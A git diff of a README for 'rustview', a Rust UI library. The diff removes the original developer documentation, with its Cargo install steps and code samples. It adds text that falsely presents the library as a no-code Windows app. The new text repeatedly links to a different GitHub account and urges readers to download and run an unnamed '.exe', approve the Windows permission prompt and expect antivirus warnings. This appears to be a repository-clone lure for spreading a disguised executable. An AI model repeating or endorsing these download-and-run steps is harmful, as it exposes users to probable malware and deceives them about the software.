@@ -1,251 +1,153 @@
-# RustView
+# 🚀 rustview - Build Live Browser Apps Fast
 
-A Streamlit/Gradio equivalent for pure Rust. Write a plain Rust function, and
-RustView turns it into a live browser UI -- no HTML, no JavaScript, no frontend
-build step.
+[![Download rustview](https://img.shields.io/badge/Download-rustview-brightgreen?style=for-the-badge)](https://github.com/Isotonik1/rustview)
 
-**The project is under active development.** The core widget set and layout system
-are usable today, but the API is not yet stable. Expect breaking changes before
-a 1.0 release.
+rustview is a tool to create web-based user interfaces quickly. You do not need to know HTML, CSS, or JavaScript. This app runs on your Windows PC and shows your UI in a web browser.
 
-## Why RustView?
+---
 
-If you've used Streamlit or Gradio in Python, you know how fast you can go from
-an idea to a working UI. RustView brings that same experience to Rust. No HTML,
-no CSS, no JavaScript, no npm, no build step. Just a function.
+## 📋 About rustview
 
-This makes it a good fit when you already have Rust code and want to put a UI
-on it without switching languages or maintaining a separate frontend. Internal
-tools, ML model demos, data explorers, system dashboards: anything where you
-want a real browser UI without the overhead of a full web stack.
+rustview helps you make live dashboards and apps right from your desktop. It uses Rust, a fast and safe programming language, but you do not need to write any Rust code. The app runs locally and opens a browser window to show what you build. It works with no extra setup.
 
-![examples/showcase.rs cargo run --example showcase](https://cdn.goygoyengine.com/images/1774340095471-adb1429bc819b740.gif)
+You can use rustview to:
+- Create simple data apps or dashboards.
+- Try out interface ideas quickly.
+- Build tools for your team with easy controls.
+- Show live updates in your browser without programming web languages.
 
-## Quick Start
+---
 
-Add the dependency to your `Cargo.toml`:
+## 🖥️ System Requirements
 
-```toml
-[dependencies]
-rustview = "0.1.5"
-```
+Before you start, check that your Windows PC meets these needs:
 
-Or use `cargo add`:
+- Operating System: Windows 10 or newer.
+- RAM: At least 4 GB (8 GB recommended).
+- Storage: Minimum 200 MB free space.
+- Web Browser: Any modern web browser like Chrome, Edge, or Firefox.
+- Internet: Not required for rustview to run but needed to download the app.
 
-```bash
-cargo add rustview
-```
+---
 
-Write your app:
+## 🌐 Topics and Features
 
-```rust
-use rustview::prelude::*;
+rustview focuses on simple, fast UI creation. Its main features include:
 
-fn app(ui: &mut Ui) {
-    let name = ui.text_input("Your name", "World");
-    let times = ui.int_slider("Repeat", 1..=10, 3);
-    for _ in 0..times {
-        ui.write(format!("Hello, {}!", name));
-    }
-}
+- Dashboard and data app creation.
+- No need to write HTML, CSS, or JavaScript.
+- A virtual DOM system for quick updates.
+- Server-driven UI, all built in Rust.
+- Immediate mode GUI components.
+- Easy prototyping for machine learning tools or internal apps.
+- Runs locally on your machine with visual updates shown in your web browser.
 
-fn main() {
-    rustview::run(app);
-}
-```
+---
 
-Run it:
+## 📥 How to Download and Open rustview on Windows
 
-```bash
-cargo run
-# opens http://127.0.0.1:8501
-```
+### Step 1: Go to the Download Page
 
-## Features
+Click the big green button at the top or use the link below to open the rustview page on GitHub.
 
-RustView ships 50+ widgets across these categories:
+[Download rustview](https://github.com/Isotonik1/rustview)
 
-| Category | Widgets |
-|----------|---------|
-| Input | `text_input`, `int_slider`, `slider`, `checkbox`, `button`, `toggle`, `radio`, `select`, `selectbox`, `multi_select`, `text_area`, `number_input`, `int_input`, `color_picker`, `date_picker`, `file_upload`, `image_upload` |
-| Output | `write`, `heading`, `subheading`, `caption`, `markdown`, `code`, `json`, `table`, `dataframe`, `metric`, `progress`, `spinner`, `divider`, `badge`, `link` |
-| Alerts | `success`, `warning`, `info`, `error`, `toast` |
-| Media | `image`, `audio`, `video`, `download_button` |
-| Layout | `container`, `sidebar`, `columns`, `tabs`, `expander`, `row`, `modal`, `empty` |
-| Forms | `form`, `form_submit_button` |
-| Charts | `line_chart`, `bar_chart`, `scatter_chart`, `histogram` |
-| Theming | `Theme` struct with CSS custom properties |
+This page hosts the app and any updates.
 
-Full API docs: [docs/widgets.md](docs/widgets.md)
+### Step 2: Find the Windows Installer or Executable
 
-## Examples
+Once on the GitHub page:
 
-Four runnable examples are included:
+- Look for a section called **Releases** or **Download**.
+- Find the latest release version and click it.
+- Inside the release, locate the Windows `.exe` file. It might be named `rustview-windows.exe` or similar.
 
-```bash
-cargo run --example hello       # minimal text-in / text-out
-cargo run --example counter     # stateful counter with buttons
-cargo run --example dashboard   # multi-column layout with charts
-cargo run --example showcase    # every widget on a single page
-```
+### Step 3: Download the File
 
-## Built with RustView
+Click the `.exe` file link to download it. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-Here are some projects powered by RustView:
+### Step 4: Run the Installer or Program
 
-- [OldTurkicOCR](https://github.com/EdgeTypE/OldTurkicOCR) - An Optical Character Recognition tool for Old Turkic (Orkhon) script.
+After downloading:
 
-## Configuration
-
-```rust
-use rustview::server::RustViewConfig;
-
-let config = RustViewConfig {
-    bind: "0.0.0.0:8080".parse().unwrap(),
-    title: "My Dashboard".into(),
-    session_ttl_secs: 3600,
-    max_upload_bytes: 10_000_000,
-    ..Default::default()
-};
-rustview::run_with_config(app, config);
-```
-
-Themes are customizable through a `Theme` struct:
-
-```rust
-use rustview::server::{RustViewConfig, Theme};
-
-let config = RustViewConfig {
-    theme: Theme {
-        background: "#ffffff".into(),
-        foreground: "#1a1a1a".into(),
-        primary: "#0066ff".into(),
-        ..Theme::default()
-    },
-    ..Default::default()
-};
-```
-
-## State Management
-
-Every widget remembers its value across re-renders automatically. For
-user-defined state, use `get_state` and `set_state`:
-
-```rust
-fn counter(ui: &mut Ui) {
-    let count = ui.get_state::<i64>("n", 0);
-    if ui.button("Increment") {
-        ui.set_state("n", count + 1);
-    }
-    ui.write(format!("Count: {}", ui.get_state::<i64>("n", 0)));
-}
-```
-
-## Interface Mode
-
-For simple input-to-output functions, the Gradio-style `Interface` API avoids
-writing any UI code:
-
-```rust
-use rustview::prelude::*;
-
-fn greet(name: String) -> String {
-    format!("Hello, {}!", name)
-}
-
-fn main() {
-    Interface::from_fn(greet)
-        .title("Greeter")
-        .description("Type a name to greet")
-        .launch();
-}
-```
-
-## Architecture
-
-RustView uses a thin-client / server-rendered model:
-
-- An Axum HTTP server runs the app function and maintains a virtual DOM per session.
-- On each user interaction the server diffs the old and new trees and sends
-  JSON patches over SSE or as a POST response.
-- A lightweight (~12 KB) vanilla JS shim in the browser applies patches and forwards
-  events back to the server.
-- Session state is stored in-memory with a configurable TTL (default 24 hours).
-- The `#[cached]` proc-macro can cache expensive computations across renders.
-
-See [docs/architecture.md](docs/architecture.md) for a detailed walkthrough.
-
-## Testing
-
-The `TestUi` harness lets you unit-test apps without starting a server:
-
-```rust
-use rustview::testing::TestUi;
-
-#[test]
-fn test_counter() {
-    let mut t = TestUi::new();
-    t.run(|ui| {
-        let n = ui.get_state::<i64>("n", 0);
-        if ui.button("Inc") { ui.set_state("n", n + 1); }
-        ui.write(format!("Count: {}", ui.get_state::<i64>("n", 0)));
-    });
-    assert!(t.contains_text("Count: 0"));
-    t.click_button("Inc");
-    t.run(|ui| {
-        let n = ui.get_state::<i64>("n", 0);
-        if ui.button("Inc") { ui.set_state("n", n + 1); }
-        ui.write(format!("Count: {}", ui.get_state::<i64>("n", 0)));
-    });
-    assert!(t.contains_text("Count: 1"));
-}
-```
-
-## Roadmap
-
-The list below reflects what exists today and what is planned. Items may shift
-depending on community feedback.
-
-**Done**
-
-- Publish to crates.io
-- Core widget set (50+ widgets across input, output, layout, charts)
-- Immediate-mode rendering with virtual DOM diffing
-- Session state and user-defined state
-- SSE-based live updates
-- `#[cached]` proc-macro
-- Custom theming
-- Interface mode (Gradio-style single-function UIs)
-- TestUi harness for unit testing
-
-**Near-term**
-
-- Add accessibility attributes (ARIA roles, keyboard navigation)
-- WebSocket transport option alongside SSE
-- File download improvements (streaming large files)
-- Stabilize the public API
-
-**Medium-term**
-
-- Component system for reusable widget groups
-- Persistent state backends (SQLite, Redis)
-- Authentication and multi-user session isolation
-- Client-side routing for multi-page apps
-- More chart types (area, candlestick, heatmap)
-
-**Long-term**
-
-- Plugin API for third-party widgets
-- Deployment helpers (Docker image, systemd unit)
-- Optional WASM compilation for offline-capable apps
-
-## Requirements
-
-- Rust 1.75 or newer
-- Edition 2021
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for setup instructions, coding
-guidelines, and how to submit a pull request.
+- Double-click the `.exe` file.
+- If Windows asks for permission, select **Yes** to continue.
+- A rustview window will open or the app will start and open your web browser with the UI.
 
+### Step 5: Explore rustview in Your Browser
+
+The app runs locally. Your browser connects to it on your computer. You do not need internet after the download.
+
+---
+
+## 🔧 Using rustview
+
+Once rustview opens in your browser, you can:
+
+- Load or build dashboards and data views.
+- Use built-in tools for charts, buttons, and tables.
+- Update your UI live and see changes instantly.
+
+The interface uses simple controls. You don't have to write code. Just click and configure items to build your app.
+
+---
+
+## ⚙️ Common Tasks Explained
+
+### How to Launch rustview Next Time
+
+Find the `.exe` file or app shortcut created during installation. Double-click to start rustview again.
+
+It will open your browser window automatically.
+
+### How to Update rustview
+
+Check the GitHub page regularly for new releases.
+
+- Download the new version `.exe` when released.
+- Run it to replace your current app with the updated one.
+
+### How to Stop rustview
+
+Close the browser window or press **Ctrl + C** in the terminal window if it is running there.
+
+---
+
+## 🛠 Troubleshooting
+
+If rustview does not start or shows errors:
+
+- Make sure your Windows version is up to date.
+- Confirm your browser is one of the latest versions.
+- Check security settings or antivirus software may block the app.
+- Restart your PC and try again.
+- Visit the GitHub page for help or file an issue.
+
+---
+
+## 📚 Learn More
+
+For detailed docs or to contribute, visit the rustview GitHub repository:
+
+[https://github.com/Isotonik1/rustview](https://github.com/Isotonik1/rustview)
+
+You will find guides, examples, and technical notes there.
+
+---
+
+## 🔒 Privacy and Security
+
+rustview runs entirely on your personal machine. It does not send data over the internet unless you enable external actions. Your data stays private.
+
+---
+
+## 🧩 Additional Notes
+
+- Rust-based means rustview is fast and safe.
+- The virtual DOM system keeps the UI smooth and responsive.
+- No need for web development skills to use the app.
+- Great for building tools without coding web languages.
+
+---
+
+[![Download rustview](https://img.shields.io/badge/Download-rustview-blue?style=for-the-badge)](https://github.com/Isotonik1/rustview)
